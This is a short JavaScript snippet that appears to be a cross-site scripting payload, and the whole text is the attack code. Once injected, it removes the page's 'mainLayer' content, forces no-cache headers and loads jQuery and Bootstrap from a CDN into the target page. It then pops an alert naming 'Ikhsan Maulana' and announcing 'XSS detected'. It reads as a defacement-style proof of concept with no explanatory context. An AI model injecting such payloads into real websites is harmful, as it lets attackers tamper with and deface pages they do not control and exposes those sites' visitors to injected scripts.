var metaElement = document.createElement("meta");metaElement.setAttribute("http-equiv", "Cache-Control");metaElement.setAttribute("content", "no-cache, no-store, must-revalidate");document.head.appendChild(metaElement);
document.getElementById("mainLayer").remove();
function addJs(src){var scriptElement=document.createElement("script");scriptElement.src=src;document.body.appendChild(scriptElement);}
addJs("https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js");addJs("https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js");
function addCss(src){var linkElement=document.createElement("link");linkElement.rel="stylesheet";linkElement.type="text/css";linkElement.href=src;document.head.appendChild(linkElement);}
addCss("https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css");alert("Ikhsan Maulana, XSS detected");